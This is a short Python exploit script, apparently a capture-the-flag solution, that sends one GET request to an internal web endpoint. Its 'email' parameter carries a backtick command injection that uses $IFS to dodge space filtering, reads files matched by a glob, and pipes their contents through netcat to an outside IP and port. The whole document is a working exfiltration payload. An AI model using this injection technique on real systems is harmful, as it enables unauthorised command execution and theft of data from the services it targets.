#!/usr/bin/env python3

import requests

server_ip = "43.201.98.91"
server_port = 50012


url = f"""http://10.113.108.156:3000/zebra?apiKey=binary_glibberish&email=`cat$IFS/f*/p/a/t/h/*/f*|nc$IFS$*{server_ip}$IFS$*{server_port}`@s.com"""

requests.get(url)